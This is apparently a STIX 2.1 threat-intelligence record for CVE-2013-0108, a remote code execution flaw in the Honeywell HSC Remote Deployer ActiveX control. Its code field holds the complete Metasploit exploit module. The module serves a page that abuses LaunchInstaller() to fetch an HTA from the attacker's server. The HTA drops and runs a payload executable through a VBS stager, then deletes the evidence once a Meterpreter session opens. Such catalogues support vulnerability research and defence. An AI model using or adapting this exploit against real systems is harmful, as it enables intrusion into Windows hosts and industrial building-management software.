{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--275ccd49-867a-4108-a4d9-8648f7727aa4",
    "created": "2024-08-14T16:44:33.706832Z",
    "modified": "2024-08-14T16:44:33.706837Z",
    "name": "\"Honeywell HSC Remote Deployer ActiveX Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in the Honeywell HSC Remote Deployer ActiveX. This control can be abused by using the LaunchInstaller() function to execute an arbitrary HTA from a remote location. This module has been tested successfully with the HSC Remote Deployer ActiveX installed with Honeywell EBI R410.1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/honeywell_hscremotedeploy_exec.rb",
            "external_id": "honeywell_hscremotedeploy_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-0108"
        },
        {
            "source_name": "reference",
            "url": "https://www.rapid7.com/blog/post/2013/03/11/cve-2013-0108-honeywell-ebi"
        },
        {
            "source_name": "reference",
            "url": "http://ics-cert.us-cert.gov/pdf/ICSA-13-053-02.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"Honeywell HSC Remote Deployer ActiveX Remote Code Execution\",\n        'Description' => %q{\n          This module exploits a vulnerability found in the Honeywell HSC Remote Deployer\n          ActiveX. This control can be abused by using the LaunchInstaller() function to\n          execute an arbitrary HTA from a remote location. This module has been tested\n          successfully with the HSC Remote Deployer ActiveX installed with Honeywell EBI\n          R410.1.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'juan vazquez'\n        ],\n        'References' => [\n          [ 'CVE', '2013-0108' ],\n          [ 'OSVDB', '90583' ],\n          [ 'BID', '58134' ],\n          [ 'URL', 'https://www.rapid7.com/blog/post/2013/03/11/cve-2013-0108-honeywell-ebi' ],\n          [ 'URL', 'http://ics-cert.us-cert.gov/pdf/ICSA-13-053-02.pdf' ]\n        ],\n        'Payload' => {\n          'Space' => 2048,\n          'StackAdjustment' => -3500\n        },\n        'DefaultOptions' => {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n        'Platform' => 'win',\n        'Targets' => [\n          [ 'Automatic', {} ]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2013-02-22',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n              stdapi_sys_config_getenv\n            ]\n          }\n        }\n      )\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def primer\n    hardcoded_uripath(\"/SystemDisplays/RemoteInstallWelcome.hta\")\n  end\n\n  def exploit\n    @var_exename = rand_text_alpha(5 + rand(5)) + \".exe\"\n    @dropped_files = [\n      @var_exename\n    ]\n    super\n  end\n\n  def on_new_session(session)\n    if session.type == \"meterpreter\"\n      session.core.use(\"stdapi\") unless session.ext.aliases.include?(\"stdapi\")\n\n      @dropped_files.delete_if do |file|\n        win_file = file.gsub(\"/\", \"\\\\\\\\\")\n        begin\n          wintemp = session.sys.config.getenv('TEMP')\n          win_file = \"#{wintemp}\\\\#{win_file}\"\n          session.shell_command_token(%Q|attrib.exe -r \"#{win_file}\"|)\n          session.fs.file.rm(win_file)\n          print_good(\"Deleted #{file}\")\n          true\n        rescue ::Rex::Post::Meterpreter::RequestError\n          print_error(\"Failed to delete #{win_file}\")\n          false\n        end\n      end\n    end\n  end\n\n  def build_hta(cli)\n    var_shellobj\t= rand_text_alpha(rand(5) + 5);\n    var_fsobj\t= rand_text_alpha(rand(5) + 5);\n    var_fsobj_file\t= rand_text_alpha(rand(5) + 5);\n    var_vbsname\t= rand_text_alpha(rand(5) + 5);\n    var_writedir\t= rand_text_alpha(rand(5) + 5);\n\n    var_origLoc\t= rand_text_alpha(rand(5) + 5);\n    var_byteArray\t= rand_text_alpha(rand(5) + 5);\n    var_writestream\t= rand_text_alpha(rand(5) + 5);\n    var_strmConv\t= rand_text_alpha(rand(5) + 5);\n\n    p = regenerate_payload(cli);\n    exe = generate_payload_exe({ :code => p.encoded })\n\n    # Doing in this way to bypass the ADODB.Stream restrictions on JS,\n    # even when executing it as an \"HTA\" application\n    # The encoding code has been stolen from ie_unsafe_scripting.rb\n    print_status(\"Encoding payload into vbs/javascript/hta...\");\n\n    # Build the content that will end up in the .vbs file\n    vbs_content\t= Rex::Text.to_hex(%Q|\nDim #{var_origLoc}, s, #{var_byteArray}\n#{var_origLoc} = SetLocale(1033)\n|)\n    # Drop the exe payload into an ansi string (ansi ensured via SetLocale above)\n    # for conversion with ADODB.Stream\n    vbs_ary = []\n    # The output of this loop needs to be as small as possible since it\n    # gets repeated for every byte of the executable, ballooning it by a\n    # factor of about 80k (the current size of the exe template).  In its\n    # current form, it's down to about 4MB on the wire\n    exe.each_byte do |b|\n      vbs_ary << Rex::Text.to_hex(\"s=s&Chr(#{(\"%d\" % b)})\\n\")\n    end\n    vbs_content << vbs_ary.join(\"\")\n\n    # Continue with the rest of the vbs file;\n    # Use ADODB.Stream to convert from an ansi string to it's byteArray equivalent\n    # Then use ADODB.Stream again to write the binary to file.\n    # print_status(\"Finishing vbs...\");\n    vbs_content << Rex::Text.to_hex(%Q|\nDim #{var_strmConv}, #{var_writedir}, #{var_writestream}\n                    #{var_writedir} = WScript.CreateObject(\"WScript.Shell\").ExpandEnvironmentStrings(\"%TEMP%\") & \"\\\\#{@var_exename}\"\n\nSet #{var_strmConv} = CreateObject(\"ADODB.Stream\")\n\n#{var_strmConv}.Type = 2\n#{var_strmConv}.Charset = \"x-ansi\"\n#{var_strmConv}.Open\n#{var_strmConv}.WriteText s, 0\n#{var_strmConv}.Position = 0\n#{var_strmConv}.Type = 1\n#{var_strmConv}.SaveToFile #{var_writedir}, 2\n\nSetLocale(#{var_origLoc})|)\n\n    hta = <<-EOS\n      <script>\n      var #{var_shellobj} = new ActiveXObject(\"WScript.Shell\");\n      var #{var_fsobj}    = new ActiveXObject(\"Scripting.FileSystemObject\");\n      var #{var_writedir} = #{var_shellobj}.ExpandEnvironmentStrings(\"%TEMP%\");\n      var #{var_fsobj_file} = #{var_fsobj}.OpenTextFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\",2,true);\n\n      #{var_fsobj_file}.Write(unescape(\"#{vbs_content}\"));\n      #{var_fsobj_file}.Close();\n\n      #{var_shellobj}.run(\"wscript.exe \" + #{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\", 1, true);\n      #{var_shellobj}.run(#{var_writedir} + \"\\\\\\\\\" + \"#{@var_exename}\", 0, false);\n      #{var_fsobj}.DeleteFile(#{var_writedir} + \"\\\\\\\\\" + \"#{var_vbsname}.vbs\");\n      window.close();\n      </script>\n    EOS\n\n    return hta\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n\n    if agent !~ /MSIE \\d/\n      print_error(\"Browser not supported: #{agent.to_s}\")\n      send_not_found(cli)\n      return\n    end\n\n    uri = ((datastore['SSL']) ? \"https://\" : \"http://\")\n    uri << ((datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST'])\n    uri << \":#{datastore['SRVPORT']}\"\n\n    print_status(\"Request received for #{request.uri}\");\n\n    if request.uri =~ /\\/SystemDisplays\\/RemoteInstallWelcome.hta/\n      hta = build_hta(cli)\n      print_status(\"Sending HTA application\")\n      send_response(cli, hta, { 'Content-Type' => 'application/hta' })\n      return\n    end\n\n    html = <<-EOS\n    <html>\n    <body>\n    <object id=\"RemoteInstaller\" classid=\"clsid:0D080D7D-28D2-4F86-BFA1-D582E5CE4867\">\n    </object>\n    <script>\n      RemoteInstaller.LaunchInstaller(\"#{uri}\", \"\", false);\n    </script>\n    </body>\n    </html>\n    EOS\n\n    print_status(\"Sending html\")\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-02-22",
    "x_mitre_platforms": [
        "win'"
    ]
}